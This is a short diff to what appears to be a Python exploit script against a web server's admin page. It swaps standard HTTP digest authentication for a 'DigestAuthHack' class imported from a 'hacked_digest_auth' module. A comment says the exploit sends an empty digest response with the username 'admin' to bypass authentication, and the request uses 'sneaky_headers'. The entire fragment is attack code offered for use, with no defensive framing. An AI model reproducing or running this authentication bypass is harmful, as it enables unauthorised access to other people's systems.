@@ -58,9 +58,11 @@
 # WE MODIFY 'response=""' TO BE EMPTY WITH THE USERNAME "ADMIN" THAT IS ALL
 ################################################################################
 import os
+import re
 import requests
 import hacked_digest_auth
 import hacked_seleniumrequest
+from hacked_digest_auth import DigestAuthHack
 
 url                 =   "http://" + arguments.target + ":" + arguments.port
 ime_server_index    =   url + "/index.html"
@@ -99,7 +101,7 @@ if __name__ == "__main__":
 # read the damn replay ya idiot. CAPTURE A DAMN REPLAY YA IDIOT
     index = browser.request("GET",
                             url = ime_server_index, 
-                            auth=HTTPDigestAuth('admin', 'Does_it_really_matter')
+                            auth=DigestAuthHack('admin', 'Does_it_really_matter'),
                             headers = sneaky_headers
                             )
 
